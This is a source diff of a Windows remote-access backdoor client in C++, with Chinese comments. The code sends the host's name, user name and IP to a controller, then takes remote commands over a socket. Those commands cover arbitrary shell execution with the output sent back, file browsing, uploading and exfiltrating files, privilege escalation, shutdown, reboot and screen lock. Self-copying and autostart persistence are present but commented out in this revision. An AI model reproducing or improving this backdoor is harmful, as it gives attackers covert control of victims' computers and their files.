@@ -6,24 +6,26 @@ int FileBrowse(SOCKET fd, char* str);//文件浏览
 
 int recvFile(SOCKET fd, char* buf);//文件下载
 
-int shell(SOCKET fd, const char* cmd, char* result);//执行shell指令
-
 int sendFile(SOCKET fd, char* buf);//文件上传
 
 bool UpPrivilegeValue();//提权操作
 
+int shell(SOCKET fd, const char* cmd, char* result);//执行shell指令
+
+void process(SOCKET fd);
+
 int main()
 {
-	if (true == UpPrivilegeValue())
-	{
-		//cout << "successs" << endl;
-	}
+	//if (true == UpPrivilegeValue())
+	//{
+	//	//cout << "successs" << endl;
+	//}
 
-	char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
+	//char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
 
-	copySelf(pathName);//将文件复制到系统目录
+	//copySelf(pathName);//将文件复制到系统目录
 
-	ComputerStart(pathName);//设置程序开机自启
+	//ComputerStart(pathName);//设置程序开机自启
 
 	init_Socket();//创建客户端socket
 
@@ -36,106 +38,12 @@ int main()
 
 	GetPCMessage(fd);//将PC信息发送给服务端
 
+	thread th = thread(process, fd);
+	th.detach();
+
 	HeartBeat(fd);//心跳功能
 
-	char command[50] = {0};//存储接收的指令
-	char recvbuf[BUFSIZ] = { 0 };//接收信息的缓冲区
-	//创建对应的线程，需要使用时就加入
-	while (true)
-	{
-		recv(fd, command, 50, 0);
-		decode(command);
 
-		if (strcmp(command, "filebrowse"))
-		{
-			while (true)
-			{
-				recv(fd, recvbuf, BUFSIZ, 0);
-				if (strcmp(recvbuf, "exit") == 0)
-				{
-					break;
-				}
-				thread th1 = thread(FileBrowse, fd, recvbuf);
-				th1.join();
-			}
-			continue;
-		}
-		else if (strcmp(command, "shell"))
-		{
-			recv(fd, recvbuf, BUFSIZ, 0);//获得shell指令
-			char res[BUFSIZ * 2] = { 0 };
-			thread th2 = thread(shell, fd, recvbuf, res);
-			th2.join();
-			continue;
-		}
-		else if(strcmp(command, "download"))
-		{
-			recv(fd, recvbuf, BUFSIZ, 0);
-			thread th3 = thread(sendFile, fd, recvbuf);
-			th3.join();
-			continue;
-		}
-		else if (strcmp(command, "upload"))
-		{
-			recv(fd, recvbuf, BUFSIZ, 0);
-			thread th4 = thread(recvFile, fd, recvbuf);
-			th4.join();
-			continue;
-		}
-		else if(strcmp(command, "upright"))
-		{
-			thread th5 = thread(UpPrivilegeValue);
-			th5.join();
-			continue;
-		}
-		else if (strcmp(command, "kill"))
-		{
-			char text[BUFSIZ] = "Client has exit!";
-			encode(text);
-			send(fd, text, BUFSIZ, 0);//关闭客户端
-			exit(0);
-			continue;
-		}
-		else if (strcmp(command, "shutdown"))
-		{
-			char text[BUFSIZ] = "shutdown after 10s";
-			encode(text);
-			send(fd, text, BUFSIZ, 0);
-			system("shutdown -s -t 1");//关机
-			continue;
-		}
-		else if (strcmp(command, "reboot"))
-		{
-			char text[BUFSIZ] = "reboot after 10s";
-			encode(text);
-			send(fd, text, BUFSIZ, 0);
-			system("shutdown -r -t 10"); //重启
-			continue;
-		}
-		else if (strcmp(command, "cancel"))
-		{
-			system("shutdown -a");//取消关机
-			continue;
-		}
-		else if (strcmp(command, "lock"))
-		{
-			char text[BUFSIZ] = "lock successs";
-			encode(text);
-			send(fd, text, BUFSIZ, 0);
-			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");//锁屏
-			continue;
-		}
-		else
-		{
-			char text[BUFSIZ] = "Error code";
-			encode(text);
-			send(fd, text, BUFSIZ, 0);//发送指令错误
-			continue;
-		}
-		ZeroMemory(recvbuf, sizeof(recvbuf));//初始化
-		ZeroMemory(command, sizeof(command));//初始化
-		Sleep(2000);
-	}
 	closesocket(fd);//关闭客户端socket
 
 	close_Socket();//WSACleanup
@@ -160,11 +68,11 @@ int GetPCMessage(SOCKET fd)
 	//cout << msg.IP << endl;
 
 	send(fd, msg.PCName, BUFSIZ, 0);
-	
+
 	send(fd, UserName, BUFSIZ, 0);
-	
+
 	send(fd, msg.IP, BUFSIZ, 0);
-	
+
 	return 0;
 }
 
@@ -172,11 +80,14 @@ int FileBrowse(SOCKET fd, char* str)
 {
 	//获取目标路径下的文件名
 	char FileName[FileNameRow][FileNameCol];
-	char Zero[FileNameCol] = { 0 };
-	GetFileName(FileName, str);
-	for (int i = 0; i < FileNameRow; i++)
+	for (int i = 0; i < FileNameCol; i++)
 	{
-		if (strcmp(FileName[i], Zero))
+		ZeroMemory(FileName[i], sizeof(FileName[i]));
+	}
+	GetFileName(FileName, str);
+	for (int i = 0; i < FileNameCol; i++)
+	{
+		if (FileName[i][0] != 0)
 		{
 			//printf("%s\n", FileName[i]);
 			send(fd, FileName[i], FileNameRow, 0);
@@ -196,23 +107,23 @@ int sendFile(SOCKET fd, char* buf)
 	Sleep(200);
 
 	HANDLE hFile = CreateFile((LPCWSTR)buf, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-	if (hFile == INVALID_HANDLE_VALUE) 
+	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		return 1;
 	}
-	while (true) 
+	while (true)
 	{   //发送文件的buf
 		bRet = ReadFile(hFile, sendbuf, 1024, &dwRead, NULL);
 		if (bRet == FALSE)
 		{
 			break;
 		}
-		else if (dwRead == 0) 
+		else if (dwRead == 0)
 		{
 			Sleep(100);
 			break;
 		}
-		else 
+		else
 		{
 			encode(sendbuf);
 			send(fd, sendbuf, BUFSIZ * 2, 0);
@@ -234,18 +145,18 @@ int recvFile(SOCKET fd, char* buf)//文件下载
 	DWORD count;                // 写入的数据计数
 
 	hFile = CreateFile((LPCWSTR)(CString)buf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
-	if (hFile == INVALID_HANDLE_VALUE) 
+	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		return 1;
 	}
 
-	while (true) 
+	while (true)
 	{
 		// 从客户端读数据
 		ZeroMemory(recvBuf, sizeof(recvBuf));
 		len = recv(fd, recvBuf, 1024, 0);
 		decode(recvBuf);
-		if (strlen(recvBuf) < 5) 
+		if (strlen(recvBuf) < 5)
 		{
 			if (strcmp(recvBuf, "EOF") == 0) {
 				CloseHandle(hFile);
@@ -273,7 +184,7 @@ int shell(SOCKET fd, const char* cmd, char* result)
 		while (fgets(buf_ps, sizeof(buf_ps), ptr) != NULL)
 		{
 			strcat(result, buf_ps);
-			if (strlen(result) > BUFSIZ * 2)
+			if (strlen(result) > BUFSIZ * 4)
 			{
 				break;
 			}
@@ -282,12 +193,8 @@ int shell(SOCKET fd, const char* cmd, char* result)
 		ptr = NULL;
 		iRet = 0;  // 处理成功
 	}
-	//else
-	//{
-	//    printf("popen %s error\n", ps);
-	//    iRet = -1; // 处理失败
-	//}
-	send(fd, result, BUFSIZ * 2, 0);
+	//cout << result;
+	send(fd, result, BUFSIZ * 4, 0);
 	return iRet;
 }
 
@@ -328,4 +235,110 @@ bool UpPrivilegeValue()
 	}
 	//printf("sucessful");
 	return true;
+}
+
+void process(SOCKET fd)
+{
+	char command[50] = { 0 };//存储接收的指令
+	char recvbuf[BUFSIZ] = { 0 };//接收信息的缓冲区
+	//创建对应的线程，需要使用时就加入
+
+	while (true)
+	{
+		if (recv(fd, command, 50, 0) > 0)
+		{
+			decode(command);
+
+			if (!strcmp(command, "filebrowse"))
+			{
+				recv(fd, recvbuf, BUFSIZ, 0);
+				decode(recvbuf);
+				FileBrowse(fd, recvbuf);
+				continue;
+			}
+			else if (!strcmp(command, "shell"))
+			{
+				char res[BUFSIZ * 4] = { 0 };
+				if (recv(fd, recvbuf, BUFSIZ, 0) > 0)//获得shell指令
+				{
+					decode(recvbuf);
+					shell(fd, recvbuf, res);
+					/*thread th2 = thread(shell, fd, recvbuf, res);
+					th2.join();*/
+					continue;
+				}
+			}
+			else if (!strcmp(command, "download"))
+			{
+				recv(fd, recvbuf, BUFSIZ, 0);
+				decode(recvbuf);
+				sendFile(fd, recvbuf);
+				/*thread th3 = thread(sendFile, fd, recvbuf);
+				th3.join();*/
+				continue;
+			}
+			else if (!strcmp(command, "upload"))
+			{
+				recv(fd, recvbuf, BUFSIZ, 0);
+				decode(recvbuf);
+				recvFile(fd, recvbuf);
+				/*thread th4 = thread(recvFile, fd, recvbuf);
+				th4.join();*/
+				continue;
+			}
+			else if (!strcmp(command, "upright"))
+			{
+				thread th5 = thread(UpPrivilegeValue);
+				th5.join();
+				continue;
+			}
+			else if (!strcmp(command, "kill"))
+			{
+				char text[BUFSIZ] = "Client has exit!";
+				encode(text);
+				send(fd, text, BUFSIZ, 0);//关闭客户端
+				exit(0);
+				continue;
+			}
+			else if (!strcmp(command, "shutdown"))
+			{
+				char text[BUFSIZ] = "shutdown after 10s";
+				encode(text);
+				send(fd, text, BUFSIZ, 0);
+				system("shutdown -s -t 1");//关机
+				continue;
+			}
+			else if (!strcmp(command, "reboot"))
+			{
+				char text[BUFSIZ] = "reboot after 10s";
+				encode(text);
+				send(fd, text, BUFSIZ, 0);
+				system("shutdown -r -t 10"); //重启
+				continue;
+			}
+			else if (!strcmp(command, "cancel"))
+			{
+				system("shutdown -a");//取消关机
+				continue;
+			}
+			else if (!strcmp(command, "lock"))
+			{
+				char text[BUFSIZ] = "lock successs";
+				encode(text);
+				send(fd, text, BUFSIZ, 0);
+				system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");//锁屏
+				continue;
+			}
+			else
+			{
+				char text[BUFSIZ] = "Error code";
+				encode(text);
+				send(fd, text, BUFSIZ, 0);//发送指令错误
+				continue;
+			}
+			ZeroMemory(recvbuf, sizeof(recvbuf));//初始化
+			ZeroMemory(command, sizeof(command));//初始化
+		}
+		Sleep(2000);
+	}
 }
